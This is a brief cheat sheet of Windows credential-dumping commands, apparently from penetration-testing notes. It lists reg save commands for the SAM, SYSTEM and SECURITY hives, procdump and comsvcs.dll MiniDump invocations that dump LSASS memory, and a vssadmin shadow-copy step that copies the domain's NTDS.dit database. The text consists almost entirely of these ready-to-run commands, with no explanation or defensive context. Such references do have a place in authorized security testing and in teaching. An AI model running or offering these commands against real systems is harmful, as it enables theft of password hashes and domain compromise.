# Dumping Credentials

## Dumping registry hives

```batch title="cmd.exe"
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

## Dumping LSASS memory

```batch title="cmd.exe"
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```batch title="cmd.exe (Cloned Process)"
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```

```batch title="cmd.exe (comsvcs.dll)"
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```

## Copying NTDS.dit

```powershell title="Create shadow copy and copy NTDS.dit"
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit